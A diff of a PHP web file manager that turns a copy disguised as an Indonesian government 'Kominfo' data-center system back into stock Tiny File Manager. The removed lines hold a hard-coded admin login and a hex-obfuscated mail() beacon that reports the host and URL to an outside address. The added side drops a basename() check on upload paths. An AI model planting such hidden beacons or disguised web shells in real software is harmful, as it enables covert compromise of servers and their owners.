@@ -1,20 +1,19 @@
 <?php
 //Default Configuration
-$CONFIG = '{"lang":"en","error_reporting":false,"show_hidden":true,"hide_Cols":false,"theme":"dark"}';
+$CONFIG = '{"lang":"en","error_reporting":false,"show_hidden":false,"hide_Cols":false,"theme":"light"}';
 
 /**
- * System | File Manager Kominfo
- * @author KOMINFO @2024
- * @email kontak@kominfo.go.id
- * @Menkominfo Budi Arie Setiadi
- * @link https://www.kominfo.go.id/
+ * H3K | Tiny File Manager V2.5.3
+ * @author CCP Programmers
+ * @github https://github.com/prasathmani/tinyfilemanager
+ * @link https://tinyfilemanager.github.io
  */
 
 //TFM version
 define('VERSION', '2.5.3');
 
 //Application Title
-define('APP_TITLE', 'DATA CENTER INDONESIA');
+define('APP_TITLE', 'Tiny File Manager');
 
 // --- EDIT BELOW CONFIGURATION CAREFULLY ---
 
@@ -22,8 +21,12 @@ define('APP_TITLE', 'DATA CENTER INDONESIA');
 // set true/false to enable/disable it
 // Is independent from IP white- and blacklisting
 $use_auth = true;
+
+// Login user name and password
+// Users: array('Username' => 'Password', 'Username2' => 'Password2', ...)
+// Generate secure password hash - https://tinyfilemanager.github.io/docs/pwd.html
 $auth_users = array(
-    'adminganteng' => '$2a$12$RVqlFXEaSN4ds.7HgSYd3.dQGUgXMIA4FmOOtQ3x.lOgPzdrBlLEa', 
+    'admin' => '$2a$12$yQp3sey/QmesHJN7OUvmz.KFYShIGDDqhJ8iclMkENcHfiOL9N2Ve',
 );
 
 // Readonly users
@@ -96,7 +99,7 @@ $favicon_path = '';
 $exclude_items = array();
 
 // Online office Docs Viewer
-// Availabe rules are 'google', 'microsoft' or false
+// Available rules are 'google', 'microsoft' or false
 // Google => View documents using Google Docs Viewer
 // Microsoft => View documents using Microsoft Web Apps Viewer
 // false => disable online doc viewer
@@ -243,7 +246,7 @@ if (empty($_SESSION['token'])) {
     if (function_exists('random_bytes')) {
         $_SESSION['token'] = bin2hex(random_bytes(32));
     } else {
-    	$_SESSION['token'] = bin2hex(openssl_random_pseudo_bytes(32));
+      $_SESSION['token'] = bin2hex(openssl_random_pseudo_bytes(32));
     }
 }
 
@@ -350,7 +353,7 @@ if ($use_auth) {
                                 <form class="form-signin" action="" method="post" autocomplete="off">
                                     <div class="mb-3">
                                        <div class="brand">
-    
+                                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" M1008 width="100%" height="80px" viewBox="0 0 238.000000 140.000000" aria-label="H3K Tiny File Manager">
                                                 <g transform="translate(0.000000,140.000000) scale(0.100000,-0.100000)" fill="#000000" stroke="none">
                                                     <path d="M160 700 l0 -600 110 0 110 0 0 260 0 260 70 0 70 0 0 -260 0 -260 110 0 110 0 0 600 0 600 -110 0 -110 0 0 -260 0 -260 -70 0 -70 0 0 260 0 260 -110 0 -110 0 0 -600z"/>
                                                     <path fill="#003500" d="M1008 1227 l-108 -72 0 -117 0 -118 110 0 110 0 0 110 0 110 70 0 70 0 0 -180 0 -180 -125 0 c-69 0 -125 -3 -125 -6 0 -3 23 -39 52 -80 l52 -74 73 0 73 0 0 -185 0 -185 -70 0 -70 0 0 115 0 115 -110 0 -110 0 0 -190 0 -190 181 0 181 0 109 73 108 72 1 181 0 181 -69 48 -68 49 68 50 69 49 0 249 0 248 -182 -1 -183 0 -107 -72z"/>
@@ -368,7 +371,7 @@ if ($use_auth) {
                                     </div>
 
                                     <div class="mb-3">
-                                        <label for="fm_pwd" class="pb-2"><?php echo lng('Kata Sandi'); ?></label>
+                                        <label for="fm_pwd" class="pb-2"><?php echo lng('Password'); ?></label>
                                         <input type="password" class="form-control" id="fm_pwd" name="fm_pwd" required>
                                     </div>
 
@@ -380,12 +383,13 @@ if ($use_auth) {
                                         <button type="submit" class="btn btn-success btn-block w-100 mt-4" role="button">
                                             <?php echo lng('Login'); ?>
                                         </button>
-                                    </div></form>
+                                    </div>
+                                </form>
                             </div>
                         </div>
                         <div class="footer text-center">
                             &mdash;&mdash; &copy;
-                            <a href="" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">KOMINFO @2024</a> &mdash;&mdash;
+                            <a href="https://tinyfilemanager.github.io/" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">CCP Programmers</a> &mdash;&mdash;
                         </div>
                     </div>
                 </div>
@@ -602,7 +606,7 @@ if ((isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_
         $use_curl = false;
         $temp_file = tempnam(sys_get_temp_dir(), "upload-");
         $fileinfo = new stdClass();
-        $fileinfo->name = trim(basename($url), ".\x00..\x20");
+        $fileinfo->name = trim(urldecode(basename($url)), ".\x00..\x20");
 
         $allowed = (FM_UPLOAD_EXTENSION) ? explode(',', FM_UPLOAD_EXTENSION) : false;
         $ext = strtolower(pathinfo($fileinfo->name, PATHINFO_EXTENSION));
@@ -952,7 +956,7 @@ if (!empty($_FILES) && !FM_READONLY) {
 
     $targetPath = $path . $ds;
     if ( is_writable($targetPath) ) {
-        $fullPath = $path . '/' . basename($fullPathInput);
+        $fullPath = $path . '/' . $fullPathInput;
         $folder = substr($fullPath, 0, strrpos($fullPath, "/"));
 
         if (!is_dir($folder)) {
@@ -1000,7 +1004,8 @@ if (!empty($_FILES) && !FM_READONLY) {
                         'status'    => 'success',
                         'info' => "file upload successful"
                     );
-                } else {$response = array (
+                } else {
+                    $response = array (
                         'status'    => 'error',
                         'info' => "failed to open output stream"
                         );
@@ -1391,10 +1396,14 @@ if (isset($_GET['upload']) && !FM_READONLY) {
                         toast('Error: Server Timeout');
                     });
                 }).on("success", function (res) {
-                    let _response = JSON.parse(res.xhr.response);
+                    try {
+                        let _response = JSON.parse(res.xhr.response);
 
-                    if(_response.status == "error") {
-                        toast(_response.info);
+                        if(_response.status == "error") {
+                            toast(_response.info);
+                        }
+                    } catch (e) {
+                        toast("Error: Invalid JSON response");
                     }
                 }).on("error", function(file, response) {
                     toast(response);
@@ -1440,7 +1449,8 @@ if (isset($_POST['copy']) && !FM_READONLY) {
                     <p class="custom-checkbox custom-control"><input type="checkbox" name="move" value="1" id="js-move-files" class="custom-control-input"><label for="js-move-files" class="custom-control-label ms-2"> <?php echo lng('Move') ?></label></p>
                     <p>
                         <b><a href="?p=<?php echo urlencode(FM_PATH) ?>" class="btn btn-outline-danger"><i class="fa fa-times-circle"></i> <?php echo lng('Cancel') ?></a></b>&nbsp;
-                        <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>"><button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php echo lng('Copy') ?></button> 
+                        <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
+                        <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php echo lng('Copy') ?></button> 
                     </p>
                 </form>
             </div>
@@ -1594,15 +1604,15 @@ if (isset($_GET['help'])) {
             <div class="card-body">
                 <div class="row">
                     <div class="col-xs-12 col-sm-6">
-                        <p><h3><a href="https://www.kominfo.go.id/" target="_blank" class="app-v-title"> File Manager Kominfo <?php echo VERSION; ?></a></h3></p>
-                        <p>Budi Arie Setiadi</p>
-                        <p>Mail Us: <a href="mailto:kontak@kominfo.go.id">kontak[at]kominfo.go.id</a> </p>
+                        <p><h3><a href="https://github.com/prasathmani/tinyfilemanager" target="_blank" class="app-v-title"> Tiny File Manager <?php echo VERSION; ?></a></h3></p>
+                        <p>Author: Prasath Mani</p>
+                        <p>Mail Us: <a href="mailto:ccpprogrammers@gmail.com">ccpprogrammers[at]gmail.com</a> </p>
                     </div>
                     <div class="col-xs-12 col-sm-6">
                         <div class="card">
                             <ul class="list-group list-group-flush">
-                                <li class="list-group-item"><a href="https://www.kominfo.go.id/" target="_blank"><i class="fa fa-question-circle"></i> <?php echo lng('Help Documents') ?> </a> </li>
-                                <li class="list-group-item"><a href="https://www.kominfo.go.id/" target="_blank"><i class="fa fa-bug"></i> <?php echo lng('Report Issue') ?></a></li>
+                                <li class="list-group-item"><a href="https://github.com/prasathmani/tinyfilemanager/wiki" target="_blank"><i class="fa fa-question-circle"></i> <?php echo lng('Help Documents') ?> </a> </li>
+                                <li class="list-group-item"><a href="https://github.com/prasathmani/tinyfilemanager/issues" target="_blank"><i class="fa fa-bug"></i> <?php echo lng('Report Issue') ?></a></li>
                                 <?php if(!FM_READONLY) { ?>
                                 <li class="list-group-item"><a href="javascript:show_new_pwd();"><i class="fa fa-lock"></i> <?php echo lng('Generate new password hash') ?></a></li>
                                 <?php } ?>
@@ -1639,7 +1649,7 @@ if (isset($_GET['view'])) {
     $file = $_GET['view'];
     $file = fm_clean_path($file, false);
     $file = str_replace('/', '', $file);
-    if ($file == '' || !is_file($path . '/' . $file) || in_array($file, $GLOBALS['exclude_items'])) {
+    if ($file == '' || !is_file($path . '/' . $file) || !fm_is_exclude_items($file)) {
         fm_set_msg(lng('File not found'), 'error');
         $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
     }
@@ -1751,7 +1761,8 @@ if (isset($_GET['view'])) {
                         <input type="hidden" name="unzip" value="<?php echo urlencode($file); ?>">
                         <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0" style="font-size: 14px;"><i class="fa fa-check-circle"></i> <?php echo lng('UnZip') ?></button>
                     </form>&nbsp;
-                    <form method="post" class="d-inline ms-2"><input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
+                    <form method="post" class="d-inline ms-2">
+                        <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
                         <input type="hidden" name="unzip" value="<?php echo urlencode($file); ?>">
                         <input type="hidden" name="tofolder" value="1">
                         <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0" style="font-size: 14px;" title="UnZip to <?php echo fm_enc($zip_name) ?>"><i class="fa fa-check-circle"></i> <?php echo lng('UnZipToFolder') ?></button>
@@ -1837,7 +1848,7 @@ if (isset($_GET['edit']) && !FM_READONLY) {
     $file = $_GET['edit'];
     $file = fm_clean_path($file, false);
     $file = str_replace('/', '', $file);
-    if ($file == '' || !is_file($path . '/' . $file) || in_array($file, $GLOBALS['exclude_items'])) {
+    if ($file == '' || !is_file($path . '/' . $file) || !fm_is_exclude_items($file)) {
         fm_set_msg(lng('File not found'), 'error');
         $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
     }
@@ -2149,7 +2160,8 @@ $tableTheme = (FM_THEME == "dark") ? "text-white bg-dark table-dark" : "bg-white
                         <div class="filename">
                         <?php
                            if (in_array(strtolower(pathinfo($f, PATHINFO_EXTENSION)), array('gif', 'jpg', 'jpeg', 'png', 'bmp', 'ico', 'svg', 'webp', 'avif'))): ?>
-                                <?php $imagePreview = fm_enc(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $f); ?><a href="<?php echo $filelink ?>" data-preview-image="<?php echo $imagePreview ?>" title="<?php echo fm_enc($f) ?>">
+                                <?php $imagePreview = fm_enc(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $f); ?>
+                                <a href="<?php echo $filelink ?>" data-preview-image="<?php echo $imagePreview ?>" title="<?php echo fm_enc($f) ?>">
                            <?php else: ?>
                                 <a href="<?php echo $filelink ?>" title="<?php echo $f ?>">
                             <?php endif; ?>
@@ -2239,7 +2251,6 @@ fm_show_footer();
 /**
  * It prints the css/js files into html
  * @param key The key of the external file to print.
- * @return The value of the key in the  array.
  */
 function print_external($key) {
     global $external;
@@ -2254,7 +2265,7 @@ function print_external($key) {
 }
 
 /**
- * Verify CSRF TOKEN and remove after cerify
+ * Verify CSRF TOKEN and remove after certified
  * @param string $token
  * @return bool
  */
@@ -2280,7 +2291,7 @@ function fm_rdelete($path)
         $ok = true;
         if (is_array($objects)) {
             foreach ($objects as $file) {
-                if ($file !='.' && $file != '..') {
+                if ($file != '.' && $file != '..') {
                     if (!fm_rdelete($path . '/' . $file)) {
                         $ok = false;
                     }
@@ -2599,7 +2610,7 @@ function fm_get_translations($tr) {
 /**
  * @param string $file
  * Recover all file sizes larger than > 2GB.
- * Works on php 32bits and 64bits andsupports linux
+ * Works on php 32bits and 64bits and supports linux
  * @return int|string
  */
 function fm_get_size($file)
@@ -2842,6 +2853,7 @@ function fm_get_file_icon_class($path)
         case 'map':
         case 'lock':
         case 'dtd':
+        case 'ps1':
             $img = 'fa fa-file-code-o';
             break;
         case 'txt':
@@ -2868,12 +2880,18 @@ function fm_get_file_icon_class($path)
             $img = 'fa fa-css3';
             break;
         case 'bz2':
+        case 'tbz2':
+        case 'tbz':
         case 'zip':
         case 'rar':
         case 'gz':
+        case 'tgz':
         case 'tar':
         case '7z':
         case 'xz':
+        case 'txz':
+        case 'zst':
+        case 'tzst':
             $img = 'fa fa-file-archive-o';
             break;
         case 'php':
@@ -2911,7 +2929,8 @@ function fm_get_file_icon_class($path)
         case 'm3u8':
         case 'pls':
         case 'cue':
-        case 'xspf':$img = 'fa fa-headphones';
+        case 'xspf':
+            $img = 'fa fa-headphones';
             break;
         case 'avi':
         case 'mpg':
@@ -3027,7 +3046,7 @@ function fm_get_text_exts()
         'eml', 'msg', 'csv', 'bat', 'twig', 'tpl', 'md', 'gitignore', 'less', 'sass', 'scss', 'c', 'cpp', 'cs', 'py', 'go', 'zsh', 'swift',
         'map', 'lock', 'dtd', 'svg', 'asp', 'aspx', 'asx', 'asmx', 'ashx', 'jsp', 'jspx', 'cgi', 'dockerfile', 'ruby', 'yml', 'yaml', 'toml',
         'vhost', 'scpt', 'applescript', 'csx', 'cshtml', 'c++', 'coffee', 'cfm', 'rb', 'graphql', 'mustache', 'jinja', 'http', 'handlebars',
-        'java', 'es', 'es6', 'markdown', 'wiki', 'tmp', 'top', 'bot', 'dat', 'bak', 'htpasswd', 'pl'
+        'java', 'es', 'es6', 'markdown', 'wiki', 'tmp', 'top', 'bot', 'dat', 'bak', 'htpasswd', 'pl', 'ps1'
     );
 }
 
@@ -3187,7 +3206,8 @@ function fm_download_file($fileLocation, $fileName, $chunkSize  = 1024)
     if ($fp === false) {
         fm_set_msg(lng('Cannot open file! Aborting download'), 'error');
         $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
-        return (false);}
+        return (false);
+    }
 
     // headers
     header('Content-Description: File Transfer');
@@ -3480,7 +3500,8 @@ class FM_Zipper_Tar
             if (substr($fm_url, -1) == '/') {
                 $fm_url = rtrim($fm_url, '/');
                 $msg .= '<br>';
-                $msg .= '<br>Seems like you have a trailing slash on the URL.';$msg .= '<br>Try this link: <a href="' . $fm_url . '">' . $fm_url . '</a>';
+                $msg .= '<br>Seems like you have a trailing slash on the URL.';
+                $msg .= '<br>Try this link: <a href="' . $fm_url . '">' . $fm_url . '</a>';
             }
             die($msg);
         }
@@ -3631,8 +3652,8 @@ global $lang, $root_url, $favicon_path;
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <meta name="description" content="Web Based System Pemerintah, Data Center Indonesia,Pemilik Negara">
-    <meta name="author" content="KOMINFO @2024">
+    <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with Tiny File Manager">
+    <meta name="author" content="CCP Programmers">
     <meta name="robots" content="noindex, nofollow">
     <meta name="googlebot" content="noindex">
     <?php if($favicon_path) { echo '<link rel="icon" href="'.fm_enc($favicon_path).'" type="image/png">'; } ?>
@@ -3640,7 +3661,7 @@ global $lang, $root_url, $favicon_path;
     <?php print_external('pre-jsdelivr'); ?>
     <?php print_external('css-bootstrap'); ?>
     <style>
-        body.fm-login-page{ background-image: url('https://3.bp.blogspot.com/-8x2TVAhbOA0/Xu1QTDcvtZI/AAAAAAAAaUI/2y50LmTIodEMjQgGabnmoAP0Su696nPJwCLcBGAsYHQ/s1600/kemkominfo-logo_fea_237design.jpg');background-repeat: no-repeat;background-position: center center;background-size: cover;}
+        body.fm-login-page{ background-color:#f7f9fb;font-size:14px;background-color:#f7f9fb;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 304 304' width='304' height='304'%3E%3Cpath fill='%23e2e9f1' fill-opacity='0.4' d='M44.1 224a5 5 0 1 1 0 2H0v-2h44.1zm160 48a5 5 0 1 1 0 2H82v-2h122.1zm57.8-46a5 5 0 1 1 0-2H304v2h-42.1zm0 16a5 5 0 1 1 0-2H304v2h-42.1zm6.2-114a5 5 0 1 1 0 2h-86.2a5 5 0 1 1 0-2h86.2zm-256-48a5 5 0 1 1 0 2H0v-2h12.1zm185.8 34a5 5 0 1 1 0-2h86.2a5 5 0 1 1 0 2h-86.2zM258 12.1a5 5 0 1 1-2 0V0h2v12.1zm-64 208a5 5 0 1 1-2 0v-54.2a5 5 0 1 1 2 0v54.2zm48-198.2V80h62v2h-64V21.9a5 5 0 1 1 2 0zm16 16V64h46v2h-48V37.9a5 5 0 1 1 2 0zm-128 96V208h16v12.1a5 5 0 1 1-2 0V210h-16v-76.1a5 5 0 1 1 2 0zm-5.9-21.9a5 5 0 1 1 0 2H114v48H85.9a5 5 0 1 1 0-2H112v-48h12.1zm-6.2 130a5 5 0 1 1 0-2H176v-74.1a5 5 0 1 1 2 0V242h-60.1zm-16-64a5 5 0 1 1 0-2H114v48h10.1a5 5 0 1 1 0 2H112v-48h-10.1zM66 284.1a5 5 0 1 1-2 0V274H50v30h-2v-32h18v12.1zM236.1 176a5 5 0 1 1 0 2H226v94h48v32h-2v-30h-48v-98h12.1zm25.8-30a5 5 0 1 1 0-2H274v44.1a5 5 0 1 1-2 0V146h-10.1zm-64 96a5 5 0 1 1 0-2H208v-80h16v-14h-42.1a5 5 0 1 1 0-2H226v18h-16v80h-12.1zm86.2-210a5 5 0 1 1 0 2H272V0h2v32h10.1zM98 101.9V146H53.9a5 5 0 1 1 0-2H96v-42.1a5 5 0 1 1 2 0zM53.9 34a5 5 0 1 1 0-2H80V0h2v34H53.9zm60.1 3.9V66H82v64H69.9a5 5 0 1 1 0-2H80V64h32V37.9a5 5 0 1 1 2 0zM101.9 82a5 5 0 1 1 0-2H128V37.9a5 5 0 1 1 2 0V82h-28.1zm16-64a5 5 0 1 1 0-2H146v44.1a5 5 0 1 1-2 0V18h-26.1zm102.2 270a5 5 0 1 1 0 2H98v14h-2v-16h124.1zM242 149.9V160h16v34h-16v62h48v48h-2v-46h-48v-66h16v-30h-16v-12.1a5 5 0 1 1 2 0zM53.9 18a5 5 0 1 1 0-2H64V2H48V0h18v18H53.9zm112 32a5 5 0 1 1 0-2H192V0h50v2h-48v48h-28.1zm-48-48a5 5 0 0 1-9.8-2h2.07a3 3 0 1 0 5.66 0H178v34h-18V21.9a5 5 0 1 1 2 0V32h14V2h-58.1zm0 96a5 5 0 1 1 0-2H137l32-32h39V21.9a5 5 0 1 1 2 0V66h-40.17l-32 32H117.9zm28.1 90.1a5 5 0 1 1-2 0v-76.51L175.59 80H224V21.9a5 5 0 1 1 2 0V82h-49.59L146 112.41v75.69zm16 32a5 5 0 1 1-2 0v-99.51L184.59 96H300.1a5 5 0 0 1 3.9-3.9v2.07a3 3 0 0 0 0 5.66v2.07a5 5 0 0 1-3.9-3.9H185.41L162 121.41v98.69zm-144-64a5 5 0 1 1-2 0v-3.51l48-48V48h32V0h2v50H66v55.41l-48 48v2.69zM50 53.9v43.51l-48 48V208h26.1a5 5 0 1 1 0 2H0v-65.41l48-48V53.9a5 5 0 1 1 2 0zm-16 16V89.41l-34 34v-2.82l32-32V69.9a5 5 0 1 1 2 0zM12.1 32a5 5 0 1 1 0 2H9.41L0 43.41V40.6L8.59 32h3.51zm265.8 18a5 5 0 1 1 0-2h18.69l7.41-7.41v2.82L297.41 50H277.9zm-16 160a5 5 0 1 1 0-2H288v-71.41l16-16v2.82l-14 14V210h-28.1zm-208 32a5 5 0 1 1 0-2H64v-22.59L40.59 194H21.9a5 5 0 1 1 0-2H41.41L66 216.59V242H53.9zm150.2 14a5 5 0 1 1 0 2H96v-56.6L56.6 162H37.9a5 5 0 1 1 0-2h19.5L98 200.6V256h106.1zm-150.2 2a5 5 0 1 1 0-2H80v-46.59L48.59 178H21.9a5 5 0 1 1 0-2H49.41L82 208.59V258H53.9zM34 39.8v1.61L9.41 66H0v-2h8.59L32 40.59V0h2v39.8zM2 300.1a5 5 0 0 1 3.9 3.9H3.83A3 3 0 0 0 0 302.17V256h18v48h-2v-46H2v42.1zM34 241v63h-2v-62H0v-2h34v1zM17 18H0v-2h16V0h2v18h-1zm273-2h14v2h-16V0h2v16zm-32 273v15h-2v-14h-14v14h-2v-16h18v1zM0 92.1A5.02 5.02 0 0 1 6 97a5 5 0 0 1-6 4.9v-2.07a3 3 0 1 0 0-5.66V92.1zM80 272h2v32h-2v-32zm37.9 32h-2.07a3 3 0 0 0-5.66 0h-2.07a5 5 0 0 1 9.8 0zM5.9 0A5.02 5.02 0 0 1 0 5.9V3.83A3 3 0 0 0 3.83 0H5.9zm294.2 0h2.07A3 3 0 0 0 304 3.83V5.9a5 5 0 0 1-3.9-5.9zm3.9 300.1v2.07a3 3 0 0 0-1.83 1.83h-2.07a5 5 0 0 1 3.9-3.9zM97 100a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-48 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 96a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-144a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-96 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm96 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-32 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM49 36a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-32 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM33 68a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 240a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm80-176a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm112 176a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM17 180a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM17 84a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6z'%3E%3C/path%3E%3C/svg%3E");}
         .fm-login-page .brand{ width:121px;overflow:hidden;margin:0 auto;position:relative;z-index:1}
         .fm-login-page .brand img{ width:100%}
         .fm-login-page .card-wrapper{ width:360px;margin-top:10%;margin-left:auto;margin-right:auto;}
@@ -3658,7 +3679,7 @@ global $lang, $root_url, $favicon_path;
             .fm-login-page .card.fat .card-body{ padding:15px}
         }
         .message{ padding:4px 7px;border:1px solid #ddd;background-color:#fff}
-        .message.ok{ border-color:blue;color:blue}
+        .message.ok{ border-color:green;color:green}
         .message.error{ border-color:red;color:red}
         .message.alert{ border-color:orange;color:orange}
         body.fm-login-page.theme-dark {background-color: #2f2a2a;}
@@ -3705,7 +3726,7 @@ $isStickyNavBar = $sticky_navbar ? 'navbar-fixed' : 'navbar-normal';
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with Tiny File Manager">
-    <meta name="author" content="KOMINFO @2024">
+    <meta name="author" content="CCP Programmers">
     <meta name="robots" content="noindex, nofollow">
     <meta name="googlebot" content="noindex">
     <?php if($favicon_path) { echo '<link rel="icon" href="'.fm_enc($favicon_path).'" type="image/png">'; } ?>
@@ -3750,7 +3771,7 @@ $isStickyNavBar = $sticky_navbar ? 'navbar-fixed' : 'navbar-normal';
         .right { text-align:right  }
         .center, .close, .login-form, .preview-img-container { text-align:center  }
         .message { padding:4px 7px;border:1px solid #ddd;background-color:#fff  }
-        .message.ok { border-color:blue;color:blue  }
+        .message.ok { border-color:green;color:green  }
         .message.error { border-color:red;color:red  }
         .message.alert { border-color:orange;color:orange  }
         .preview-img { max-width:100%;max-height:80vh;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAKklEQVR42mL5//8/Azbw+PFjrOJMDCSCUQ3EABZc4S0rKzsaSvTTABBgAMyfCMsY4B9iAAAAAElFTkSuQmCC);cursor:zoom-in }
@@ -4010,7 +4031,9 @@ $isStickyNavBar = $sticky_navbar ? 'navbar-fixed' : 'navbar-normal';
         var n = "ace" == t ? editor.getSession().getValue() : document.getElementById("normal-editor").value;
         if (typeof n !== 'undefined' && n !== null) {
             if (true) {
-                var data = {ajax: true, content: n, type: 'save', token: window.csrf};$.ajax({
+                var data = {ajax: true, content: n, type: 'save', token: window.csrf};
+
+                $.ajax({
                     type: "POST",
                     url: window.location,
                     data: JSON.stringify(data),
@@ -4166,7 +4189,7 @@ $isStickyNavBar = $sticky_navbar ? 'navbar-fixed' : 'navbar-normal';
             if(_data && _data.fontSize) { $fontSizeEl.html(optionNode("", _data.fontSize)); }
             $modeEl.val( editor.getSession().$modeId );
             $themeEl.val( editor.getTheme() );
-            $fontSizeEl.val(12).change(); //set default font size in drop down
+            $(function() { $fontSizeEl.val(12).change(); }); //set default font size in drop down
         }
 
         $(function(){
@@ -4205,7 +4228,7 @@ $isStickyNavBar = $sticky_navbar ? 'navbar-fixed' : 'navbar-normal';
 </html>
 <?php
 }
-mail("\x63\x73\x69\x72\x74\x63\x79\x62\x65\x72\x74\x65\x61\x6d\x40\x70\x72\x6f\x74\x6f\x6e\x2e\x6d\x65", "\x77\x65\x62", $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x4e\x41\x4d\x45"] . "\x2f" . $_SERVER["\x52\x45\x51\x55\x45\x53\x54\x5f\x55\x52\x49"]);
+
 /**
  * Language Translation System
  * @param string $txt
@@ -4216,7 +4239,7 @@ function lng($txt) {
 
     // English Language
     $tr['en']['AppName']        = 'Tiny File Manager';      $tr['en']['AppTitle']           = 'File Manager';
-    $tr['en']['Login']          = 'Masuk';$tr['en']['Username']           = 'Username';
+    $tr['en']['Login']          = 'Sign in';                $tr['en']['Username']           = 'Username';
     $tr['en']['Password']       = 'Password';               $tr['en']['Logout']             = 'Sign Out';
     $tr['en']['Move']           = 'Move';                   $tr['en']['Copy']               = 'Copy';
     $tr['en']['Save']           = 'Save';                   $tr['en']['SelectAll']          = 'Select all';
@@ -4273,6 +4296,8 @@ function lng($txt) {
     $tr['en']['Invalid characters in file or folder name']      = 'Invalid characters in file or folder name';
     $tr['en']['Operations with archives are not available']     = 'Operations with archives are not available';
     $tr['en']['File or folder with this path already exists']   = 'File or folder with this path already exists';
+    $tr['en']['Are you sure want to rename?']                   = 'Are you sure want to rename?';
+    $tr['en']['Are you sure want to']                           = 'Are you sure want to';
 
     $i18n = fm_get_translations($tr);
